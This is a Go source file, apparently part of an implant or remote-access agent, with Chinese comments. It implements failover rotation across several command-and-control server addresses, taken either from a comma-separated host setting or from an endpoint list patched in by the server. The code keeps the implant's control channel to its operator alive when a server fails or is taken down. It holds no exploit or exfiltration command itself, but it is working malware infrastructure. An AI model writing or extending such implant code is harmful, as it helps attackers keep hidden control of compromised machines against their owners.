package app

import (
	"implant/core/config"
	"strings"
	"sync"
)

// B7: 多 endpoint 轮转。config.Host 可为逗号分隔的多个 C2 地址（"addr1,addr2,..."）。
// 单地址（无逗号）时始终返回该地址，向后兼容。adapter 连接失败时调用 AdvanceEndpoint 轮转。

var (
	endpoints  []string
	epIdx      int
	epMu       sync.Mutex
	epInitOnce sync.Once
)

func initEndpoints() {
	// 多传输构建：服务端 patch 了端点列表（scheme://addr,...），优先使用；
	// 单传输构建或未 patch 时回落到 config.Host（历史行为不变）。
	if multi := config.MultiEndpointsList(); len(multi) > 0 {
		endpoints = multi
		return
	}
	raw := strings.ReplaceAll(config.Host, " ", "")
	for _, h := range strings.Split(raw, ",") {
		h = strings.TrimSpace(h)
		if h != "" {
			endpoints = append(endpoints, h)
		}
	}
	if len(endpoints) == 0 {
		endpoints = []string{raw}
	}
}

// CurrentEndpoint 返回当前 C2 endpoint。
func CurrentEndpoint() string {
	epInitOnce.Do(initEndpoints)
	epMu.Lock()
	defer epMu.Unlock()
	if epIdx >= len(endpoints) {
		epIdx = 0
	}
	return endpoints[epIdx]
}

// AdvanceEndpoint 轮转到下一个 endpoint（连接失败时调用），返回新的当前 endpoint。
func AdvanceEndpoint() string {
	epInitOnce.Do(initEndpoints)
	epMu.Lock()
	defer epMu.Unlock()
	epIdx = (epIdx + 1) % len(endpoints)
	return endpoints[epIdx]
}
